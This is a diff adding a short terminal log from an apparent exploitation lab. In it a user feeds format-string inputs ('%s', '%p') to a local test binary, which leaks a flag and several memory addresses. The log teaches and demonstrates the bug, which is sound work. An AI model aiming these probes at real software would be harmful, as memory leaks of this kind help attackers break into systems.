@@ -1,0 +1,15 @@
+mzj@Ubuntu-24.04:~$ cd ~/pwn-lab && echo hello | ./format
+Say something:
+hello
+
+mzj@Ubuntu-24.04:~$ cd ~/pwn-lab && echo %s | ./format
+Say something:
+flag{format_string_leaks}
+
+mzj@Ubuntu-24.04:~$ cd ~/pwn-lab && echo %p | ./format
+Say something:
+0x5dd37a0b8004
+
+mzj@Ubuntu-24.04:~$ cd ~/pwn-lab && echo %p %p %p %p | ./format
+Say something:
+0x586a6b84d004 0x586a6b84d004 0xa70252070252070 0x586a9d7472bc
